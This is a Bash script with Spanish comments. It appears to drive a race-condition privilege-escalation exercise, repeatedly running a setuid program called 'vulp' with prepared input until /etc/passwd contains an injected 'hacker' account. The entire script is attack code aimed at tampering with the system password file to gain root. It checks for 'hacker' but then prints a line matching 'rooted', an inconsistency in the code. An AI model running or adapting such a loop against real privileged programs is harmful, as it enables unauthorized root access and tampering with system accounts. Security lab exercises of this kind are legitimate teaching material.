#!/bin/bash  # Ejecutar con Bash

for i in {1..100000} # Ejecutar el ataque hasta 100,000 veces
do
    echo "Intento #$i"  # Mostrar número de intento
    ./vulp < input.txt 2>/dev/null || true  # Ejecutar vulp con input.txt, ignorar errores

    if grep -q hacker /etc/passwd; then  # Verificar si el ataque fue exitoso
        echo "✅ ¡Ataque exitoso en el intento #$i!"  # Mostrar mensaje de éxito
        grep rooted /etc/passwd  # Mostrar línea con texto 'rooted'
        exit 0  # Salir con éxito
    fi
done

echo "No se logro el ataque"  # Mensaje si ningún intento tuvo éxito
